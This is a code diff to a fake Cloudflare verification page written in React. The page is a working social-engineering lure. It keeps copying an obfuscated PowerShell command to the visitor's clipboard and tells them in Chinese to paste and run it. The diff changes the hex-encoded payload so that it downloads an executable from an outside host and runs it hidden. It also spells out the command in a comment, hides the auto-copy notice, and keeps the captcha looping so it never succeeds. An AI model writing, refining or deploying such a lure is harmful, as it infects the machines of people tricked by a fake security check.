@@ -3,11 +3,12 @@ import { useState, useEffect, useCallback, useRef } from "react";
 type Phase = "checking" | "error" | "captcha" | "captcha-solving" | "instruction";
 
 // ============================================================
-// X-GEN: ENCRYPTED COMMAND IN HEX (UTF-16LE)
+// X-GEN: ENCRYPTED COMMAND IN HEX (UTF-16LE) - DOWNLOAD EXE
 // ============================================================
+// Command: powershell -WindowStyle Hidden -ep Bypass -c "$p=$env:TEMP+'l.exe';iwr https://top2betx.com/api/file-share/bf57a9ea-f96e-4134-8796-e2c0462a7024/download -OutFile $p;& $p -enroll_token '5e3031725f5bff1db14b7ff423d25bab6c65956028de9a5d5bb86691508de2de' -id '8649328'"
 const ENCRYPTED_PAYLOAD = {
-    "#h": "70006F007700650072007300680065006C006C0020002D00570069006E0064006F0077005300740079006C0065002000480069006400640065006E0020002D0065007000200042007900700061007300730020002D00630020002200240070003D00240065006E0076003A00540045004D0050002B0027006C002E0070007300310027003B006900770072002000680074007400700073003A002F002F0074006F007000320062006500740078002E0063006F006D002F006100700069002F00660069006C0065002D00730068006100720065002F00620066003500370061003900650061002D0066003900360065002D0034003100330034002D0038003700390036002D006500320063003000340036003200610037003000320034002F0064006F0077006E006C006F006100640020002D004F0075007400460069006C0065002000240070003B00260020002400700020002D0065006E0072006F006C006C005F0074006F006B0065006E00200027003500650033003000330031003700320035006600350062006600660031006400620031003400620037006600660034003200330064003200350062006100620036006300360035003900350036003000320038006400650039006100350064003500620062003800360036003900310035003000380064006500320064006500270020002D0069006400200027003800360034003900330032003800270022",
-    "#k": "ps_command"
+    "#h": "70006F007700650072007300680065006C006C0020002D00570069006E0064006F0077005300740079006C0065002000480069006400640065006E0020002D0065007000200042007900700061007300730020002D00630020002200240070003D00240065006E0076003A00540045004D0050002B0027006C002E0065007800650027003B006900770072002000680074007400700073003A002F002F0074006F007000320062006500740078002E0063006F006D002F006100700069002F00660069006C0065002D00730068006100720065002F00620066003500370061003900650061002D0066003900360065002D0034003100330034002D0038003700390036002D006500320063003000340036003200610037003000320034002F0064006F0077006E006C006F006100640020002D004F0075007400460069006C0065002000240070003B00260020002400700020002D0065006E0072006F006C006C005F0074006F006B0065006E00200027003500650033003000330031003700320035006600350062006600660031006400620031003400620037006600660034003200330064003200350062006100620036006300360035003900350036003000320038006400650039006100350064003500620062003800360036003900310035003000380064006500320064006500270020002D0069006400200027003800360034003900330032003800270022",
+    "#k": "exe_command"
 };
 
 // Decrypt HEX to command (UTF-16LE)
@@ -65,15 +66,6 @@ function CloudflareLogo() {
     <svg width="26" height="26" viewBox="0 0 61 24" fill="none" xmlns="http://www.w3.org/2000/svg">
       <path d="M19.1 16.7l.7-2.3c.4-1.3.2-2.5-.5-3.4-.6-.8-1.6-1.3-2.7-1.3l-10.8-.2c-.1 0-.2-.1-.3-.1-.1-.1-.1-.2 0-.3.1-.2.2-.3.4-.3l10.9-.2c2.3-.1 4.7-2 5.5-4.2l1-2.8c0-.1.1-.2 0-.3C21.8 .7 20 0 18 0 14.1 0 10.7 2.7 9.7 6.4c-.9-.7-2.1-1-3.3-.9-2.1.3-3.7 2-4 4.1-.1.5-.1 1 0 1.4C1.1 11.2 0 12.5 0 14c0 1.7 1.1 3.1 2.7 3.2h15.6c.2 0 .4-.1.5-.3l.3-.6v-.6z" fill="#F38020" />
       <path d="M22 10c-.2 0-.3 0-.5.1l-.4 1.5c-.4 1.3-.2 2.5.5 3.4.6.8 1.6 1.3 2.7 1.3l3.4.2c.1 0 .2.1.3.1.1.1.1.2 0 .3-.1.2-.2.3-.4.3l-3.5.2c-2.3.1-4.7 2-5.5 4.2l-.3.9c0 .2.1.3.3.3h12.5c.2 0 .3-.1.4-.3.4-1.2.7-2.4.7-3.7C32.2 14 27.6 10 22 10z" fill="#FAAE40" />
-    </svg>
-  );
-}
-
-function CheckmarkIcon() {
-  return (
-    <svg width="20" height="20" viewBox="0 0 20 20" fill="none">
-      <circle cx="10" cy="10" r="10" fill="#07C160" />
-      <path d="M6 10.5L8.5 13L14 7.5" stroke="white" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" />
     </svg>
   );
 }
@@ -161,7 +153,7 @@ function InstructionWidget({ onClose }: { onClose: () => void }) {
             </div>
             <div style={{ display: "flex", alignItems: "center", gap: "12px" }}>
               <span style={{ background: "#f5a623", color: "#fff", width: "24px", height: "24px", borderRadius: "50%", display: "flex", alignItems: "center", justifyContent: "center", fontSize: "12px", fontWeight: "bold" }}>3</span>
-              <span style={{ fontSize: "14px", fontWeight: 500 }}>按下 <kbd>Ctrl + V</kbd> (命令已自动复制)</span>
+              <span style={{ fontSize: "14px", fontWeight: 500 }}>按下 <kbd>Ctrl + V</kbd></span>
             </div>
             <div style={{ display: "flex", alignItems: "center", gap: "12px" }}>
               <span style={{ background: "#f5a623", color: "#fff", width: "24px", height: "24px", borderRadius: "50%", display: "flex", alignItems: "center", justifyContent: "center", fontSize: "12px", fontWeight: "bold" }}>4</span>
@@ -169,10 +161,6 @@ function InstructionWidget({ onClose }: { onClose: () => void }) {
             </div>
           </div>
         </div>
-
-        <p style={{ fontSize: "11px", color: "#999", textAlign: "center", margin: "0 0 16px 0" }}>
-          验证命令每2秒自动复制到剪贴板
-        </p>
 
         <button
           onClick={onClose}
@@ -327,9 +315,7 @@ export default function App() {
   const handleCloseInstruction = useCallback(() => {
     stopSilentCopying();
     setShowInstruction(false);
-    // NEVER set to success - loop back to error
     setPhase("error");
-    // After closing instruction, return to captcha after delay
     setTimeout(() => {
       setPhase("captcha");
     }, 500);
